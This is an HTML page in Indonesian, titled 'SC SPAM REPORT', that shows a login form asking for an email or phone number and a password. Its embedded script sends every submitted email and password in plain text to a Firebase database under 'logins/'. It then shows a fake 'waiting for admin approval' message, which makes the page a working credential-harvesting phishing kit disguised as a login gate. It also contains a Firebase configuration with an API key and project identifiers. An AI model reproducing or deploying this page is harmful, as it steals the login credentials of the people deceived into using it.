<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SC SPAM REPORT</title>
    <style>
        * {
            font-family: Arial, sans-serif;
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(to right, #4facfe, #00f2fe);
        }

        .login-container {
            background: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0px 10px 20px rgba(0, 0, 0, 0.2);
            width: 350px;
            text-align: center;
            transition: transform 0.3s ease-in-out;
        }

        .login-container:hover {
            transform: scale(1.02);
        }

        h2 {
            margin-bottom: 20px;
            color: #333;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 14px;
            color: #555;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-top: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            transition: all 0.3s;
            font-size: 16px;
        }

        input:focus {
            border-color: #4facfe;
            box-shadow: 0px 0px 10px rgba(79, 172, 254, 0.5);
            outline: none;
        }

        .login-btn {
            background: #4facfe;
            color: #fff;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s ease-in-out;
        }

        .login-btn:hover {
            background: #008cff;
        }

        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2>üòä LOGIN DULU YA üòÅ</h2>
        <form id="loginForm">
            <div class="input-group">
                <label>EMAIL OR NUMBER :</label>
                <input type="text" id="email" required>
            </div>
            <div class="input-group">
                <label>PASSWORD :</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit" class="login-btn">Login</button>
        </form>
        <div class="footer">¬© 2018 - Diz Flyze</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.3.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDIOjpEtWakfh0WNCDC1iPj9Qm5zKDlaL4",
            authDomain: "login-24767.firebaseapp.com",
            databaseURL: "https://login-24767-default-rtdb.firebaseio.com", 
            projectId: "login-24767",
            storageBucket: "login-24767.appspot.com",
            messagingSenderId: "809521846306",
            appId: "1:809521846306:web:ee8bc0fe4e07584bad127b"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();
            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;

            set(ref(database, 'logins/' + email.replace(/[.#$[\]]/g, '_')), {
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            }).then(() => {
                alert("Tunggu Admin Menyetujui Anda Untuk Login.");
            }).catch(error => {
                alert("Login Di Tolak Oleh Admin.");
                console.error(error);
            });
        });
    </script>

</body>
</html>
